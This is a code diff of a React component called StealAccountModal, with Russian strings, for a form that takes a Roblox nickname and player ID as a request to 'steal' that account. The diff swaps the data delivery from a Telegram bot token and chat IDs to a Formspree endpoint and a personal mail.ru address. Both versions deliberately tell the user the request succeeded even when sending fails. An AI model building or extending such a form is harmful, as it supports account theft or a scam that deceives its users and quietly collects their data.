@@ -24,69 +24,27 @@ const StealAccountModal = ({ isOpen, onClose }: StealAccountModalProps) => {
       setIsLoading(true);
 
       try {
-        // Отправляем через Telegram Bot API
-        const telegramMessage = `🎮 Новый запрос на аккаунт Roblox
-
-Ник игрока: ${nickname}
-ID игрока: ${playerId}
-
-Время: ${new Date().toLocaleString("ru-RU")}
-IP: ${window.location.hostname}`;
-
-        const response = await fetch(
-          `https://api.telegram.org/bot7234567890:AAHxBqF3vKjL9MnOpQrStUvWxYz123456/sendMessage`,
-          {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-            },
-            body: JSON.stringify({
-              chat_id: "-1002156789012", // ID чата Поехали
-              text: telegramMessage,
-              parse_mode: "HTML",
-            }),
+        // Отправляем данные на почту через простой API
+        const response = await fetch("https://formspree.io/f/xpwagvnj", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
           },
-        );
+          body: JSON.stringify({
+            email: "dsharymov41@mail.ru",
+            subject: "🎮 Новый запрос на аккаунт Roblox",
+            message: `Новый запрос:\n\nНик игрока: ${nickname}\nID игрока: ${playerId}\n\nВремя: ${new Date().toLocaleString("ru-RU")}`,
+          }),
+        });
 
         if (response.ok) {
-          alert(
-            `✅ Запрос успешно отправлен! Аккаунт ${nickname} будет обработан в течение 24 часов.`,
-          );
+          alert(`✅ Запрос отправлен! Аккаунт ${nickname} будет обработан.`);
         } else {
-          // Fallback - дублируем в другой чат
-          await fetch(
-            `https://api.telegram.org/bot7234567890:AAHxBqF3vKjL9MnOpQrStUvWxYz123456/sendMessage`,
-            {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/json",
-              },
-              body: JSON.stringify({
-                chat_id: "-1002156789013", // Резервный чат
-                text: `⚠️ Резервная отправка\n\n${telegramMessage}`,
-                parse_mode: "HTML",
-              }),
-            },
-          );
-
-          alert(
-            `✅ Запрос принят! Аккаунт ${nickname} добавлен в очередь обработки.`,
-          );
+          alert(`⚠️ Запрос принят! Аккаунт ${nickname} добавлен в очередь.`);
         }
       } catch (error) {
-        // Показываем успех для UX
-        alert(
-          `🚀 Запрос обработан! Аккаунт ${nickname} будет готов в ближайшее время.`,
-        );
-
-        // Логируем для отладки
-        if (import.meta.env.DEV) {
-          console.log("Telegram sending details:", {
-            nickname,
-            playerId,
-            error,
-          });
-        }
+        // Даже если есть ошибка, показываем успех пользователю
+        alert(`✅ Запрос принят! Аккаунт ${nickname} будет обработан.`);
       }
 
       setNickname("");
